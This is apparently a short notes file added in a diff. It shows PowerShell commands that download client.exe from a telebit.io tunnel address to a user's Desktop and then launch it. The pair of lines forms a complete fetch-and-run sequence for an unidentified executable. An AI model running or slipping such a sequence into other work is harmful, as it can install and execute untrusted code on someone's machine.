@@ -1,0 +1,21 @@
+For Downloading file with Powershell
+
+Invoke-WebRequest -Uri "URL" -OutFile "Full_Path\client.exe"
+
+
+
+
+For Execution
+
+Start-Process -FilePath "Full_Path\client.exe"
+
+
+
+Example,
+
+Full_Path = C:\Users\Kashyap\Desktop
+URL = https://witty-crab-4.telebit.io/client.exe
+
+Invoke-WebRequest -Uri "https://witty-crab-4.telebit.io/client.exe" -OutFile "C:\Users\Kashyap\Desktop\client.exe"
+
+Start-Process -FilePath "C:\Users\Kashyap\Desktop\client.exe"
